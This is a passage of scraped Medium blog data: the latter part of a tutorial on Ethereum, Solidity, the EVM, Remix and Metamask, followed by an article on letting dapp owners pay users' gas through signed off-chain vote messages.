rs_signature, v_address) => true/falseBecause it\u2019s possible to derive the originating address from v, it\u2019s not necessary to submit it along with the transaction!Finally, contract addresses can then be generated from the account addresses and the transaction nounce:keccak(account address, transaction nounce) => contract address // 40 charactersWe ignore the first 12 characters to also arrive at 40 hexadecimal characters.Because external addresses and contract addresses ultimately come from our private keys, as long as we keep them safe, theft is impossible. Conversely, if we ever lose our private keys, our ethers are lost forever.Smart Contract (Server) LayerThe smart contract layer is analogous to the server layer, where the business/controller logic resides. To create a smart contract, we simply submit a transaction to a \u201cblank\u201d recipient with our logic as payload from an external account.external account => \"blank\" transaction => contract accountOn the blockchain, smart contracts exist as \u201cinternal\u201d accounts with additional storage and code fields. Together, these fields persist the data and the logic of smart contracts, respectively. As such, smart contracts can be abstracted as class constructs, and a Turing-complete programming language can be invented. Solidity is such a language, and it\u2019s the most popular because of its similarity to JavaScript.storage + code = properties + methods => class => SolidityIn Solidity, the class construct has the keyword contract. Like JavaScript, variables and functions (aka, properties and methods) can be defined inside these contract classes.pragma solidity ^0.4.24;contract {    variables;    constructor {}    functions {}}Like classes, any contracts can inherit any other contracts:pragma solidity ^0.4.24;import \"/Foo.sol\";contract Bar is Foo {    ...    }Here, Bar inherits from Foo, meaning Foo\u2019s state and functions are transferred to Bar.inheritance: base contract => derived contract// inherits variables and functions, which can be overriddenFoo\u2019s functions can be overridden if Bar\u2019s functions have the same name, inputs, and outputs. If name is the same but inputs and outputs are different, the function will be overloaded instead.function foo(uint a) {}function foo(uint a) {} // overriddenfunction foo(uint a, uint b) {} // overloadedIf more than one contract is inherited, we must specify the order from the \u201cmost base\u201d to the \u201cmost derived\u201d.contract A {}contract B is A {}contract C is A, B {} // will not compile!contract C is B, A {} // will compileIf composition is preferred over inheritance, contracts can call library functions without inheriting:pragma solidity ^0.4.24;library Foo {    function foo() {        ...    }}contract Bar {    function bar() {        Foo.foo();    }}Though a single contract can inherit from many others, on the blockchain, the codes are combined into one contract account. On the other hand, codes from libraries exist independently on the blockchain.inheritance: multiple smart contracts => one contract accountLibrary accounts on the blockchain do not have storage and cannot hold ethers. When library functions are called, the calling contract\u2019s storage and balance (aka, context) are passed in. Linking to the library contract is possible only after it has been deployed because its address on the blockchain is needed by the contracts that depend on it.1. deploy(library) => library address2. deploy(contract(library address)) => contract addressSolidity supports object-oriented design. We can create abstract contracts that others can inherit; just the function signatures can suffice.pragma solidity ^0.4.24;contract Foo {    function foo() public returns (bytes32);}contract Bar is Foo {    ...}We can also create interface contracts. Here, only the function signatures are allowed. So, no constructor, no variables, and no inheritance.pragma solidity ^0.4.24;interface Foo {    function foo() public returns (bytes32);}Solidity files should have the same name as their contract classes, and the extension .sol. To compile them, we specify the version of Solidity we want to use with a pragma statement. The outputs of the compilation process are the bytecodes and the application binary interface (ABI).pragma solidity ^0.4.24semver => major.minor.patch^ => the version indicated up to but not including the next major version~ => the version indicated up to but not including the next minor versioncompile(contract.sol) => bytecodes + ABITo deploy smart contracts, we submit \u201cblank\u201d transactions with the bytecodes attached. Whenever a contract is deployed, an \u201cinstance\u201d of it is created and its constructor method is called. Along with the bytecodes, we can also attach the arguments that we want to pass to the constructor method.contract class => bytecodes + constructor arguments => contract instanceAnalogous to the JavaScript Engine, the Ethereum Virtual Machine (EVM) resides in every node and is responsible for executing the bytecodes. As the EVM runs, it maintains a stack of opcodes that can write to the contract\u2019s storage tree. This stack can have up to 1024 elements, and each element is 32 bytes. Thus, recursion is not recommended because there\u2019s a good chance it might cause a stack overflow. In essence, the EVM is simply a state machine, and the opcodes specify how state transitions are applied to the next block state.EVM stack = opcode + opcode + ... + opcode => next block stateSome opcodes are more expensive to execute than others:Operation         Gas           DescriptionADD/SUB           3             Arithmetic operationMUL/DIV           5             Arithmetic operationADDMOD/MULMOD     8             Arithmetic operationAND/OR/XOR        3             Bitwise logic operationLT/GT/SLT/SGT/EQ  3             Comparison operationPOP               2             Stack operation PUSH/DUP/SWAP     3             Stack operationMLOAD/MSTORE      3             Memory operationJUMP              8             Unconditional jumpJUMPI             10            Conditional jumpSLOAD             200           Storage operationSSTORE            5,000/20,000  Storage operationBALANCE           400           Get balance of an accountCREATE            32,000        Create a new account using CREATECALL              25,000        Create a new account using CALLDuring a contract-creating transaction, the EVM initializes a new contract account by executing the constructor function. The code that results from this initial execution is the actual code that makes up a particular \u201cinstance\u201d.EVM(bytecodes, constructor arguments) => contract instance(s)Of course, this means we can deploy as many \u201cinstances\u201d of our smart contract \u201cclass\u201d as we want.The ABI is the developer\u2019s portal to the opcodes in the contract instance. Its function is to translate the bytecodes into JSON RPC calls to the network.developer => ABI => RPC(bytecodes) => contract instanceTo interact with our instance on the blockchain, we can use the ABI to instruct the EVM which functions and with which arguments we want to call. The most popular JavaScript library for this is web3, so named to remind us that we\u2019re building the future of Web 3.0!web3(ABI) => EVM(functions, arguments)Each web3 invocation is either a transaction (send) or a call. Transactions are sent to the network and potentially state-changing. Calls are read-only and fast. Contracts can call other contracts (aka, message), but it\u2019s always a transaction that gets things started. In other words, message calls in themselves are never state-changing, but they can be part of a state-changing transaction.transaction (send) => message call(s) => state changecall => no state changeWith web3, we can submit four types of transactions:Send ethers from one external account to another external account (like a Bitcoin transaction)Send a \u201cblank\u201d transaction to deploy a smart contract (becomes a contract account)Send ethers from an external account to a contract accountSend a transaction to execute a method within the contract account (to update or retrieve the contract state, or call other contracts)Transactions and calls are executed by the EVM as opcodes, which equate to gas. Transactions that update the blockchain or contract state require payment of ethers. These will take time and will always return the transaction hash. Calls that simply retrieve data from the blockchain or contract are \u201cinstant\u201d and free. We can return any values we want from these calls.setterFunction(ethers) => transaction hash // takes timegetterFunction(free) => any data // happens \"instantly\"Because nodes compete to mine the next block, function calls are executed redundantly across the network. To offset this waste of computing resources, a best practice is to perform as many calculations off-chain as possible.off-chain work => on-chain workThough syntactically similar to JavaScript, Solidity has several major differences. Firstly, variables are strongly typed and there are two types. State variables are primitives, while reference variables point to collections of state variables. If implicitly convertible, types can be coerced into one another.State variables:bool: boolean value (true or false) // default is falselogical operators:!   // logical negation&&  // logical conjunction||  // logical disjunction==  // equality!=  // ineqaulityconditional statements follow short circuiting rulesint / uint: positive or negative integer (\u00b2\u2078 to \u00b2\u00b2\u2075\u2076) // default is 0- can be defined with or without a number suffix- suffix must be a multiple of 8uint = uint256uint8, uint16, uint64, ... , uint256int = int256int8, int16, int64, ... , int256fixed / ufixed: positive or negative point number // default is 0fixedMxN or ufixedMxN// M = number of bits taken by the type; between 0 and 80// N = how many decimal points are available; between 8 and 256; must be divisible by 8ufixed = ufixed128x18fixed  = fixed128x18address: 20 bytes for holding an Ethereum address (40 hexadecimal characters) // default is 0x<address>.balance // get balance<address>.transfer() // send ether from current contract account to <address>// errors will throw<address>.send() // low-level counterpart to transfer()// not recommended because errors are silent (return false)We can also access account variables and functions by calling built-in properties and methods within all addresses. To get the account balance, we can call balance. To send ether to an address from the calling contract account, we can use transfer() (preferable over using send()).<address>.balance => balance in wei<address>.transfer() => transaction hashTo interact with other contract accounts, we can use call and delegatecall (callcode is deprecated) to execute functions within them.<address>.call() // call another contract// return boolean// additional modifiers: .gas() or .value()<address>.callcode() // deprecated<address>.delegatecall() // delegates a function call to another contractCall executes \u201cexternally\u201d while delegatecall executes \u201cinternally\u201d. In other words, delegatecall executes the function of another contract as if it were its own. Equivalent to calling a library function, delegatecall is capable of loading code dynamically from a different contract at runtime. The calling contract\u2019s context (i.e., address, balance, and storage) is preserved; only the code from the called contract is taken.External:<address>.call(\"foo\", 1)Internal:<address>.delegatecall(bytes4(keccak256(\"bar(uint)\")), 2)<library>.bar(2)Reference variables:fixed array: array of single-type elements and unchanging length, (byte, type[N])byte[N] // 0 < N < 33- can be allocated to storage or memory- storage arrays can be any data type- memory arrays can be anything but a mapping- declaring the array public creates a getter function that requires the index of the desired value as a parameterdynamic array: array of single-type elements and changing length (string, bytes, type[])bytes = byte[].length// returns the length of the array// dynamic arrays in storage can be resized by assigning a length.push()// appends a value to the array// new length is returned// storage arrays and bytes (not strings)uint[] memory a = new uint[](<variable length>)// variable length can be defined at runtime by using the new keyword// once defined, it will be of fixed sizemapping: collection of key-value pairs of same typemapping (<key type> => <value type>)// key type can be anything but mapping, dynamic array, contract, enum, or struct// value type can be anything// mapping is basically a hash table// every value is initialized to its default// no length property// key data is not stored, only its keccak256 hash// declaring the mapping public creates a getter function that requires the key of the desired value as a parameterstruct: collection of key-value pairs of different types- a way to define new types- cannot contain a member of its own type- struct values stored as location variables are passed by referenceenum: finite set of custom types- a user defined type- explicitly convertible to integers- requires at least one memberLike a computer\u2019s hard drive and RAM, storage variables point to persisted states while memory variables point to temporary objects, respectively.storage variable => persisted across executions // expensivememory variable => persisted during execution // cheapObviously, state variables are always in storage while local variables of reference type are there by default and can be copied to memory by using the memory keyword. In other words, they are passed by reference. On the other hand, function parameters and return parameters are in memory by default. They are passed by value. To pass them by reference, we can use the storage keyword. Local variables of value type are stored in the EVM stack until the execution completes.storage: state variables (always), local variables of reference type (default)memory: function parameters (default), return parameters (default)call stack: local variables of value type (always) // cheapestSimilar to memory is an area called calldata where parameters of external functions are stored.calldata: external function parametersThough reference variables obviously reference variables in storage, for clarity, we should specify the storage keyword anyway. To copy the referenced variables to memory, we can use the memory keyword.mapping (address => uint) balances;uint storage balance = balances[msg.sender]; // points to sender's balance in storageuint memory balance = balances[msg.sender]; // copies sender's balance to memoryBugs can hide in assumptions about where variables are being stored. This practice prevents this.Like JavaScript, Solidity functions are first-class constructs, meaning they can be passed as parameters to other functions, or be returned by them. Therefore, there are two types of functions. Internal functions are called internally by other functions within the same context (aka, inter-contract message calls). External functions are called externally via transactions (from an external account or another contract). By default, functions are internal but can be changed by using the external keyword.External: EVM => contract A => function 1Internal: contract A (function 1 => function 2)Because contracts can inherit from other contracts, we can also explicitly specify the accessibility of our functions as either public or private. Public functions can be accessed externally via transactions or internally by derived contracts, while private functions can only be accessed by the current contract. If missing the accessibility, functions are assumed to be public.Public: contract A (function 1) => contract B (function 1)Private: contract A (function 1) => contract A (function 2)Though the public and external designations both enable functions to be accessed from the outside, a best practice is to favor external if we expect the functions to ever be called externally. This is because in public functions, the EVM copies the arguments into memory, while external functions just read the arguments stored in the payload. This copying step is expensive, especially for large arguments.public functions: write arguments to memory // expensiveexternal functions: read arguments in payload // cheapType and accessibility of variables can also be specified. As \u201cinternal\u201d properties of contracts, state variables are always internal. Like functions, they can be either public or private depending on whether we want derived contracts to access them. For convenience, automatic getter functions are created for public variables.public variable => variable()It\u2019s important to note that although the private designation prevents other contracts from accessing and modifying its data, the nature of the blockchain is such that everything inside a contract is visible to all external observers. In fact, nothing is ever \u201cdeleted\u201d from the blockchain. When we make a change to our contract state, it does not \u201coverwrite\u201d anything. Though it\u2019s possible to use the selfdestruct operation to \u201cremove\u201d the data in the storage and code area of our contract, nodes have the option to keep them indefinitely.selfdestruct(recipient) => contract \"deleted\"Functions also come with default modifiers. For clarity, functions that do not modify the contract state should be marked as either pure or view. View functions need to read from the state while pure functions do not. Functions that modify state will always return a transaction hash, and nothing else. Functions that handle ethers should be designated as payable. Functions can also be decorated with custom modifiers to easily add additional behaviors and promote code reuse:modifier onlyOwner() {    require(msg.sender == owner);    _;}function foo() onlyOwner {    ...}Underscore indicates when the function body of the decorated function should execute.In summary, functions have the following signature:function doSomething(<parameter types>) {external|internal} {public|private} [pure|view|payable] [modifiers] [returns (<return types>)]<> = required{} = recommended[] = optionalsignature = name + parameter types + function types + accessibility + default modifiers + custom modifiers + return types// explicit function signatures allow for easy translation to ABITo summarize the function types and accessibilities in order of least restrictions:public: accessible by allexternal: only accessible from outsideinternal: accessible by derived contractsprivate: only accessible from withinFunction parameters are defined by type and name. Name cannot be a reserved keyword.function foo(uint a, uint b) {}Functions can return multiple values. If so, they must be declared in the function signature. There are two ways to define the return parameters:Type with name:function foo() returns (uint a) {    a = 3; // return statement not necessary}Type without name:function foo() returns (uint) {    return 3; // return statement required}Contracts can have one anonymous fallback function. This function cannot have arguments and cannot return anything, but a payload can still be supplied with the call. There is a gas limit of 2300, so the function should not do much. The fallback is executed whenever calls to the contract specify functions that do not exist or the payload is empty (i.e., a plain ether transfer). In these cases, for the contract to be able to receive plain ethers, the fallback function must be marked with payable.pragma solidity ^0.4.24;contract Token {    function () payable {        }}Though web3 always ultimately returns the transaction hash for calls that update state, state-changing functions can still return values for other contracts to consume (aka, inter-contract message calls). Nevertheless, it\u2019s still possible for such functions to emit events which web3 can watch for using the transaction hash.Like JavaScript\u2019s console function, events can be used for logging. When called, it causes its arguments to be stored in a special data structure on the blockchain (aka, transaction log). We can emit events within any function, and then watch for them using callbacks via the ABI.Example event:pragma solidity ^0.4.24;contract Token {event Transfer(        address indexed _from,        address indexed _to,        uint256 _value    );function transfer(address _to, uint256 _value) public {        ...        emit Transfer(msg.sender, _to, _value);    }}Example callback:const token = new web3.eth.Contract(ABI, ADDRESS);const event = token.Transfer();event.watch((error, result) => {    if (!error) console.log(result);});Note: Up to 3 event parameters can be indexed for faster queries.To summarize, contract declarations can contain:1. state variables2. reference variables: arrays, structs, enums, mappings3. events4. function modifiers5. constructor function6. fallback function7. external functions8. public functions9. internal functions10. private functions// ideally in this order for convention// within each function group, state-changing functions should come before read-only functions (view before pure)// variable and function names should be camelcaseLike JavaScript, there are special variables and functions that always exist in the EVM\u2019s global namespace. To access information about the transaction or the block, we can use the msg and the block global variables, respectively.Transaction properties:msg.data (bytes): the payloadmsg.gas (uint): remaining gasmsg.sender (address): sender of the message callmsg.sig (bytes4): function identifier (first four bytes of calldata)msg.value (uint): number of wei sent with the message calltx.gasprice (uint): gas price of the transactiontx.origin (address): sender of the transaction // could be insecuregasleft()(uint256): remaining gasBlock properties:block.blockhash(uint blockNumber) returns (bytes32): hash of a given block (no later than 256 blocks ago)block.coinbase (address): address of block minerblock.difficulty (uint): target value for miningblock.gaslimit (uint): total gas limit for transactionsblock.number (uint): height of block in the chainblock.timestamp (uint): time of mining (seconds since unix epoch)now (uint): equivalent to block.timestampUtility functions include cryptographic helpers such as sha256 and keccak256. Time suffixes are also available such as seconds, minutes, hours, days, weeks and years.now = block.timestamp// miners can alter to some degree as long as timestamp is greater than previous block and less than the next block// i.e., 30 second window1 = 1 seconds1 minutes = 60 seconds1 hours = 60 minutes1 days = 24 hours1 weeks = 7 days1 years = 365 days// leap seconds are ignoredEther units are also available: wei, szabo, finney and ether1 ether = 10^18 wei1 ether = 10^6 szabo1 ether = 10^3 finneyLike dollars and cents, wei is the lowest denomination of ethers. It\u2019s not possible to have fractions of wei.1 dollar = 100 cents1 ether = 1,000,000,000,000,000,000 weis// on the blockchain, ethers are stored in domination of weiWe can throw exceptions to handle errors. A thrown exception will always revert the state.assert: checks expected against actual (internal errors)require: ensures valid conditions (external/input errors)revert: always throws an exceptionLike JavaScript, the this variable is also available for easy access to the contract instance itself (can be coerced to the contract\u2019s address). Using this, it\u2019s possible to call internal functions \u201cexternally\u201d from within a contract.foo() => internal call from within contractthis.foo() => external call from within contract via EVMaddress(this) => returns contract addressthis.balance // deprecatedaddress(this).balance // recommendedInline assembly (EVM opcode) is also available to offer granular control over the EVM stack. Though beyond the scope of the typical Solidity developer, awareness of these low-level operations and limitations will prove invaluable during the design process.Writing code is easy. Designing good code is not. For example, because of underlying gas costs and a gas limit on every block, we should not iterate through dynamic arrays of indeterminate size. Instead, we should design our data models in such a way that loops are unnecessary.Poor Design:address[] owners;function isOwner(address owner) returns (bool) {    for (uint i; i < owners.length; i++) {       if (owners[i] == owner) return true;    }    return false;}Good Design:mapping (address => bool) owners;function isOwner(address owner) returns (bool) {    return owners[owner];}To summarize actions that read the state:- reading from state variables- reading from <address>.balance or this.balance- reading from members of block, tx, or msg // except msg.sig and msg.data- calling any function not marked pure- using inline assembly with \"read\" opcodesTo summary actions that modify the state:- sending ethers- creating contracts- changing state variables- emitting events- calling any function not marked as pure or view- calling selfdestruct- using low-level calls- using inline assembly with \"write\" opcodesA quick and easy way to start writing and testing smart contracts is to use Remix, an online editor maintained by the Ethereum Foundation.https://remix.ethereum.orgWith the Remix editor, we can easily author smart contracts using the Solidity programming language. Remix can automatically compile our contract to help audit our code in realtime! When we\u2019re ready, we can tell Remix to use \u201cInjected Web3\u201d (via Metamask) to deploy our contract to a real network.It\u2019s also possible for Remix to create a \u201cfake\u201d in-browser network to help us quickly test our contract! To tell Remix to host a local test network (aka, private network), select \u201cJavaScript VM\u201d for our Environment under the Run tab. For our convenience, five external accounts are automatically created and pre-funded with 100 ethers each.To deploy our contract, we simply provide the arguments that we want to pass to our constructor function before clicking \u201cDeploy\u201d.An \u201cinstance\u201d of our contract now exists on our local network. To help us test our contract, Remix automatically creates input fields for every function that exists in our contract.On the bottom panel, Remix provides a console that outputs all the things that are happening on our local network as we interact with our contract.Note that transactions are processed instantly to save us time when in reality they take much longer. In this author\u2019s opinion, Remix is the best IDE to use during the design phase of the development process!External Account (Client) LayerThe external account layer is analogous to the client layer. Architecturally, external accounts exist independently from the network. This is desirable because anyone can create an Ethereum network, and many have been created:- main Ethereum network- remote test networks (Rinkeby, Kovan, Ropsten)- remote private networks- local test network- network forksWith a tool like geth, we can become a node for the main network or our own. In essence, Ethereum is just a protocol, and anyone can implement it.Ethereum protocol => geth => Ethereum network(s)Because external accounts are completely decoupled, the same account can be used across networks! Hence, the name \u201cexternal\u201d account.external account 1 => network Aexternal account 1 => network Bexternal account 1 => ...Thus, external accounts are like \u201cemail addresses\u201d. Just one can be used for authentication across all websites.username + password => email address => any websitespublic key + private key => account address => any networksJust as an email address is created from a username and password, an external account address is created from a public key and private key. One is secret while the other is not. Like websites, dapps provide the user interfaces to the smart contracts that exist on the blockchain. Clients such as Chrome and Mist (or any web3-enabled browser) are the means by which users interact with websites and dapps.User => Email Address   => Website => Server         => DatabaseUser => Account Address => Dapp    => Smart Contract => BlockchainLike having multiple email accounts, having multiple external accounts is useful for protecting our privacy on the public blockchain. However, managing all the various credentials can be frustrating. To ease this burden, we can use BIP39 to generate account addresses and key pairs, algorithmically from a \u201cparent key\u201d, ad infinitum. All we need to remember is a 12-word mnemonic phrase.BIP39(12 words) => array[account addresses, public keys, private keys]Backed by ConsenSys, Metamask is the most popular BIP39 account management tool. Just as web3 is the developer\u2019s portal into the Ethereum blockchain, Metamask is the consumer\u2019s portal. Internally, Metamask also uses web3 to programmatically connect to the network!To create a vault, Metamask generates a random seed phrase (i.e., mnemonic phrase). To help us quickly access our vault without needing to input our seed phrase every time, Metamask asks us to create a password. With such a password, we can lock away our seed phrase in cold storage for maximum security.Internally, each account has a public key, a private key, an address and a balance. For our privacy and security, our account credentials are encrypted and stored locally. Nothing is sent to Metamask. To send ethers, Metamask signs our transaction request using our private key before submitting it to our network of choice. To receive ethers, we simply provide the senders with our address so that they can initiate the request from their end.With Metamask, we can select the main network as well as test networks. We can also setup a local network on port 8545, or provide a URL to a remote network.To better understand the flow, let\u2019s send some ethers using a test network so we don\u2019t have to spend real money. Rinkeby is the most reliable because it uses proof-of-authority instead of proof-of-work. Because ethers in test networks have no real value, there are not enough miners incentivized by proof-of-work to create a healthy level of decentralization. Consequently, attackers can easily take over the mining power. With proof-of-authority, we don\u2019t have to worry about such attacks because blocks are signed by trusted community members (aka, consortium).proof-of-authority => trusted consortiumproof-of-work => competition based on mining powerIn proof-of-work, hash rate (hashes per second) determines how likely a computer is to add the next block of transactions. To disincentivize the need for specialist hardware, Ethereum plans to move from proof-of-work to proof-of-stake. In proof-of-stake, anyone with ethers to stake can participate.proof-of-stake => competition based on putting ethers at stakeBefore we can send ethers, we need some first! To get free ethers, Rinkeby has a faucet we can use. The only requirement (to prevent abuse) is that we authenticate with our social profile.https://faucet.rinkeby.ioOnce we submit our account address, we should see that our balance has increased. Now that we have ethers to spend, let\u2019s try to send some to another account in our vault. First, let\u2019s create a second account.Copy the address of the second account, then switch back to the first account and paste in the address. Provide an amount in ether to send. We can also attach a hexadecimal string as payload. Click Next.Metamask will then ask us to confirm the transaction. Note, Metamask automatically calculates the appropriate gas limit and gas price for us!To determine the best gas values for us, Metamask simulates the function call to our contract (aka, dry run). If there are errors, Metamask will display them too!Click Submit. Metamask will now sign the transaction with our private key and submit it to the Rinkeby network.For our convenience, Metamask records all of our outgoing transactions. Clicking any one will take us to the blockchain where it resides.https://rinkeby.etherscan.io/tx/0x57cbaba8db5b1a868835356c05d1de661a811a7dd81f73a89b787b38665eed43If we switch to our second account, we should see that our balance has updated.Because external accounts are completely decoupled from the blockchain, the dapps we build will never ask for the user\u2019s keys. We can package together the transaction object based on our user\u2019s inputs, but ultimately, the user needs to sign it in order to validate it. Metamask is awesome because when we make a web3 call to submit a transaction, Metamask will bring up a modal to assist the user in the signing process. Therefore, we should build our dapps with Metamask and with this flow in mind.web3(transaction) => Metamask popup => sign(transaction) => networkAs we\u2019ve seen, every transaction will cost some amount of money. Even a tiny update to the blockchain is not free. This means our users will have to pay every time they want to change something. Thus, our value proposition should outweigh these inherent costs.value proposition > transaction feesConclusionTraditional application stacks are clients, servers, and databases. In contrast, Ethereum application stacks are external accounts, smart contracts, and the blockchain. Like JavaScript and the browser, the EVM and the Ethereum client aim to be on every laptop and computer in the world. When the \u201cserver\u201d and the \u201cdatabase\u201d are also managed by the \u201cclient\u201d, we achieve maximal decentralization and distribution. The effect, there are no single points of failure and concentrations of power. Information, value, and wealth are normalized and democratized. Such a network embodies our highest ideals of democracy and freedom.Without the concept of ownership, a free market society is impossible. Trade cannot take place without clear titles of ownership at the outset. The disparity between the rich and the poor is ever increasing, but before we can reverse the trend, we first need to give everyone a means by which to definitively prove ownership. This has been unattainable until now because records of ownership are monopolized by banks and governments, and not all are honest and trustworthy. For a more equitable world to be possible, we need a \u201ctrustless\u201d system that\u2019s immune to corruption.Ethereum is the beginning of such a system. Like a perfect world government, everyone is an equal citizen no matter the background. The only requirement is a private key that no one else has to know, even the \u201cgovernment\u201d. Under such governance, smart contracts are like \u201cbanks\u201d, each storing digital tokens of a real world asset. With a private key, we can permissionlessly enter any \u201cbank\u201d and buy anything from anyone, paying with one universal currency. The anonymous \u201csignatures\u201d we leave behind prove that the transaction took place, immutably and transparently. Ownership is assured. Privacy is protected. Trust and third-parties are disintermediated. Our world government and its banks are secured by cryptoeconomics, a combination of economic incentives and cryptographic verification.A market society that\u2019s truly free is paradisal because it tends towards perfect competition. When actors are able to compete with truthful information and legal guarantee, barriers to entry are reduced for new players. Eventually, a Pareto-optimum equilibrium will be reached such that nobody can be made better off without making someone else worse off. In other words, we undo the widening gap of economic inequality.Trust => Freedom => Love => PeaceAt HeartBank\u00ae, we believe the trustworthiest financial system is a trustless one. Human nature is paradoxical because we\u2019re capable of both extremes. In the absence of trust, our defensive instincts can lead us to the most unimaginable destructions. Where we can trust and feel trusted, we have the capacity to rise up to meet the highest expectations. When we\u2019re free to act from a place of peace, we naturally act with our \u2764\ufe0f.The way to peace is trust(less).You\u2019re now ready to build a real Ethereum dApp! \ud83d\ude07 To learn how, check out:How Truffle Works Under the HoodEthereum dApp Development for Web Developersmedium.comReferences:http://www.ethdocs.org/en/latesthttps://solidity.readthedocs.io/en/v0.4.25/introduction-to-smart-contracts.htmlhttps://ethereum.github.io/yellowpaper/paper.pdfhttps://bitcoin.org/bitcoin.pdfhttps://medium.com/@VitalikButerin/liberation-through-radical-decentralization-22fc4bedc2ac", "responses": 5, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Dapps"]}, {"title": "How to Save Your Ethereum DApp Users\u2019 From Paying Gas for Transactions", "post_link": "https://medium.com/blockchannel/how-to-save-your-ethereum-dapp-users-from-paying-gas-for-transactions-cfc665891ab4?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2018-04-18", "last_modified_date": "2018-06-16", "readtime": "5.50", "claps": 943, "voters": 109, "content": "How to Save Your Ethereum DApp Users\u2019 From Paying Gas for TransactionsAnd Instead, You as the DApp Owner Pays For ItBlockChannelFollowApr 18, 2018 \u00b7 6 min readCrosspost: This post was originally published, here. And was posted with the author\u2019, Mahesh Murthy\u2019s permission. [Learn more at Zastrin.com. Bonus: Use code \u201cBlockChannel\u201d to save 50% off all courses.]One of the friction points for Ethereum dapp adoption is that the users have to a pay gas (transaction (txn) fee) to get their transactions recorded on the blockchain. For example, I have a simple voting dapp that lets anyone vote for candidates, and the votes are stored on the blockchain. A user who wants to record her vote on the blockchain has to pay a transaction/gas fee. This is not ideal because as a dapp owner, you are expecting your application users to have Ether to pay for gas when all they want to do is perform a simple action which has nothing to do with transferring money. But if the transaction needs to be executed on the blockchain, there is no other option but to pay the fee. What if there was a way for users to execute transactions securely (vote for a candidate, as in our example) and let someone else (potentially the contract owner) record the transaction on the blockchain and pay for it themselves?Thanks to this tweet from John Backus, I had just enough information to help me implement such a solution for my voting dapp.I wanted to share details on how I implemented this solution for my simple dapp so more people can adopt this technique in their own dapps and could hopefully improve upon it. This post covers the following:A very high level overview of the public key cryptography and digital signatures, which are key to understanding this solution.The solution details and the new application flow.Implementation details (frontend js and Solidity contract code).Discuss potential issues and enhancements.Digital SignaturesFor this solution to make sense, you will need a basic understanding of how digital signatures work in cryptography. Feel free to skip this section if you know public key cryptography. I will try to explain the concept of public/private keys and digital signatures at a very high level but I highly recommend learning more in detail \u2014 wikipedia is a good place to start.Public key cryptography is a cryptographic system where you have 2 keys \u2014 public key (Pu) and a private key(Pr). You give out your public key to the entire world and keep the private key to yourself. Ex: Your Ethereum address is a public key (It\u2019s actually derived from public key, but for this exercise, let\u2019s just think of it as public key) and your private key is stored either in your browser, or on your phone/computer. As you know, for someone to send you Ether, they just need to know your public (account) address. However, only you can access the funds you own because you are the only one who knows your private key.Public key cryptography has algorithms that let you encrypt, decrypt, sign and verify messages using your pair of keys.Let\u2019s see what signing and verifying a message means through an example. Let\u2019s say user Kim has a pair of public/private keysPu = \u201c0x44ac12c1e3dfd8edaf83b6f65918229d5279a6f5\u201dPr = \u201cdbc226043e390cf39280e5edfd418d7ad61931c76509270867d300f110c46506\u201dTo sign a message, Kim executes a function sign(\u201cVote for Alice\u201d, Pr) which outputs an alpha-numeric stringsignature = 0x9127112de0033555c7f6508d963d484965a953844dfcff092712102c236467a25af57edc53b63880ea39af8ce7334f6d77a8206e805305e7c6ad919d12bfae5c1bThis is the digital signature of the message \u201cVote for Alice\u201d signed by Kim using her private key Pr.Now anyone can verify that message \u201cVote for Alice\u201d was signed by Kim by executing the verify function, verify(\u201cVote for Alice\u201d, signature) which outputs \u201c0x44ac12c1e3dfd8edaf83b6f65918229d5279a6f5\u201d. If you notice, that output is Kim\u2019s public key Pu (remember, everyone knows it\u2019s Kim\u2019s public key) which means the message was definitely signed by Kim. If you tamper with the signature or message (by changing even one character), the verify algorithm outputs a completely different public key and you will know that the message was tampered with, because the public key will be different from Pu.Solution DetailsIf you understand digital signatures, the solution is extremely trivial. Let\u2019s see how it can be used in our voting application to save users from paying gas fee without compromising their vote. You can see below all the users of dapp and the actions they perform.A voter indicates their intention to vote for a candidate by signing a message using their private key. They won\u2019t submit their transaction to the blockchain, so no txn fee is paid. The message queue in the diagram above is just an off chain location where all the vote details are stored.Anyone willing to pay the txn fee (usually the contract owner) takes the signature, candidate name and voter\u2019s account address and submits them to the blockchain.The smart contract uses the verify function to derive the public key (Ethereum account address) based on the candidate name and signature. If the derived public key matches the address of the user who signed the message, it records the vote or else fails the transaction.Implementation DetailsLet\u2019s now look at the actual implementation and how all the pieces fit together.Step 1: Sign the messageThe first step is to sign the message as a voter. We will use eth_signTypedData function to sign our message. This function has been implemented in Metamask which makes it really easy to sign messages. You can find more details and discussion about this proposal here: https://github.com/ethereum/EIPs/pull/712. You can find the code to sign the message below.One really important thing to note is, internally eth_signTypedData hashes the message and the hashed message is what gets signed. You can refer to typedSignatureHash function here for more details on hashing.Step 2: Submit the signed vote to the blockchainSince this is just a demo application, we don\u2019t store the signature and other details anywhere. It is directly displayed on the page after the message is signed. Anyone can take these details and submit to the blockchain. Here is the code that submits the vote to the blockchain:Step 3: Verify the vote details in the smart contractWe now verify in the smart contract if the submitted vote info is valid and we then record the vote.Zeppelin has a handy library called ECRecovery we can use to verify the signed message. The voteForCandidate function verifies the signed message (recover function) and updates the vote count if the verification succeeds.If you remember, I mentioned earlier that eth_signTypedData hashes the message (\u201cVote for Alice\u201d) before signing it? The solidity recover function doesn\u2019t have any knowledge of the hashing function used within eth_signTypedData and so it can\u2019t verify the message \u201cVote for Alice\u201d. It has to generate the hash of the message \u201cVote for Alice\u201d and then verify it. Instead of generating the hash inside the contract, we pre-hash all the messages beforehand and pass it in the constructor so it is easy to lookup when verifying. The code to generate the hash is in the migration file belowThat is all the code you need to get the new application working!I created a quick demo to show how this application worksThe entire working code is here: https://github.com/maheshmurthy/ethereum_voting_dapp/tree/master/chapter4The demo application is here: https://www.zastrin.com/voting-dapp-without-paying-gas.htmlPotential issues to addressThere are a few issues to consider when building a real dapp using this technique. Some of them are listed below:Where are the signed messages stored? You can use some kind of a queuing system to store these messages.What is the guarantee that the signed message eventually is submitted to the blockchain?Storing the hash of all the messages in the blockchain is not ideal, so what is the best solution for it?If you have thoughts on how to address these issues or if you see any flaws in this solution, please leave a comment!Note: Apparently, eth_signTypedData API is still not stable and has been implemented by only metamask. Please beware of this if you are planning to use this technique in mainnet/production.Further Readinghttps://en.wikipedia.org/wiki/Public-key_cryptographyhttps://en.wikipedia.org/wiki/Digital_signaturehttps://github.com/danfinlay/js-eth-personal-sign-examples/https://danfinlay.github.io/js-eth-personal-sign-examples/https://github.com/ethereum/EIPs/pull/712Thanks Chris Whinfrey and Febin John James for reviewing drafts of this article.Learn MoreIf you are interested in learning to build Ethereum decentralized applications, I have a few interesting courses at 